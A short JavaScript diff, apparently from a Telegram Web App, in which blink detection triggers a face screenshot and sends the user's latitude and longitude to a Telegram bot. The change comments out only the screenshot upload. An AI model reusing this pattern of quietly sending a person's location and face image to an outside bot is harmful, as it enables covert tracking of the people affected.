@@ -288,7 +288,7 @@
                                     gotPhoto = true;
                                     setTimeout(async () => {
                                         const dataURL = takeScreenshot("blink", detections.detection.box);
-                                        await sendToTelegramBot(dataURL);
+                                        // await sendToTelegramBot(dataURL);
                                         await sendMessageToTelegramBot(latitude, longitude);
                                         // window.Telegram.WebApp.close();
                                     }, 100);
